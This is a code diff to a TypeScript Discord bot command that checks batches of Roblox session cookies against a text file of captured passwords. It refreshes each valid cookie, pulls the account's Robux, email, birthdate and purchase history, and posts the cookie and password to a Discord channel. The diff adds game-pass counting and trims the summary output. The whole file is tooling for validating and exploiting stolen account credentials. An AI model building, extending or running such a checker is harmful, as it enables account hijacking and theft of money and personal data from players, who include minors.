@@ -83,10 +83,11 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     let totalPurchaseCount = 0;
     let totalRobuxSpent = 0;
     let totalPremium = 0;
+    let totalGamepasses = 0;
 
     const outputLines: string[] = [];
 
-    
+    // Password detection
     const passwordMap = new Map<string, string>();
     const lines = fileContent.split(/\r?\n/);
     let currentUser = '';
@@ -98,8 +99,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         passwordMap.set(currentUser.toLowerCase(), passMatch[1].trim());
       }
     }
-
-    let dataIndex = 0;
 
     for (const rawCookie of cookies) {
       try {
@@ -124,10 +123,9 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
           continue;
         }
 
-        const account = resp.data.account_info;
+        const account: any = resp.data.account_info;
         const newCookie = resp.data.new_cookie || rawCookie;
         validCount++;
-        dataIndex++;
 
         const username = account.username || 'Unknown';
         const userId = String(account.userId || '');
@@ -143,10 +141,21 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         const birthdate = account.birthdate || 'Unknown';
         const ageGroup = account.age_group || 'Unknown';
         const animations = account.animations ?? 0;
-        const lastPlayedGames = account.last_played_games?.length ?? 0;
-        const continuePlaying = account.continue_playing || [];
+        const lastPlayedGamesList: string[] = account.last_played_games || [];
+        const lastPlayedGames = lastPlayedGamesList.length;
+        const continuePlaying: any[] = account.continue_playing || [];
         const purchaseCount = continuePlaying.reduce((acc: number, g: any) => acc + (g.purchaseCount || 0), 0);
         const robuxSpent = continuePlaying.reduce((acc: number, g: any) => acc + (g.robuxSpent || 0), 0);
+        // Count gamepass purchases
+        let gamepassCount = 0;
+        for (const g of continuePlaying) {
+          const purchases: any[] = g.purchases || [];
+          for (const p of purchases) {
+            if (p.type && p.type.includes('Game Pass')) {
+              gamepassCount++;
+            }
+          }
+        }
 
         totalRobux += robux;
         totalPending += pending;
@@ -156,8 +165,10 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         totalLastPlayedGames += lastPlayedGames;
         totalPurchaseCount += purchaseCount;
         totalRobuxSpent += robuxSpent;
+        totalGamepasses += gamepassCount;
         if (premium === 'Yes') totalPremium++;
 
+        // DM embed
         const embed = buildSuccessEmbed(
           `\`\`\`\n${newCookie}\n\`\`\`\n**Username:** ${username}\n**Password:** ${password}`
         );
@@ -170,13 +181,13 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
           if (chan && chan.send) await chan.send({ embeds: [embed] });
         }
 
-        outputLines.push(`Data ${dataIndex}`);
+        // File output
         outputLines.push(`Username: ${username}`);
         outputLines.push(`Password: ${password}`);
         outputLines.push(`UserID: ${userId}`);
         outputLines.push(`Cookie: ${newCookie}`);
         outputLines.push(`Robux: ${robux}`);
-        outputLines.push(`Pending Robux: ${pending}`);
+        outputLines.push(`Pending: ${pending}`);
         outputLines.push(`Roblox Credit: ${credit}`);
         outputLines.push(`Premium: ${premium}`);
         outputLines.push(`Email: ${email}`);
@@ -199,22 +210,14 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     const elapsedSeconds = ((Date.now() - startTime) / 1000).toFixed(1);
 
     const summaryLines = [
-      '==============',
-      'Total Summary:',
-      '==============',
-      `Total Valid: ${validCount}`,
-      `Total Invalid: ${invalidCount}`,
-      `Total Robux: ${totalRobux}`,
-      `Total Pending Robux: ${totalPending}`,
-      `Total Roblox Credit: ${totalCredit}`,
-      `Total RAP: ${totalRAP}`,
-      `Total Premium Accounts: ${totalPremium}`,
-      `Total Animations: ${totalAnimations}`,
-      `Total Last Played Games: ${totalLastPlayedGames}`,
-      `Total Purchases Count: ${totalPurchaseCount}`,
-      `Total Robux Spent: ${totalRobuxSpent}`,
-      `Time Taken: ${elapsedSeconds}s`,
-      '==============',
+      '===============',
+      'Total Summary :',
+      `Total Robux : ${totalRobux}`,
+      `Total Spent : ${totalRobuxSpent}`,
+      `Premium : ${totalPremium}`,
+      `Gamepasses : ${totalGamepasses}`,
+      `Time Checked : ${elapsedSeconds}s`,
+      '===============',
       ''
     ];
 
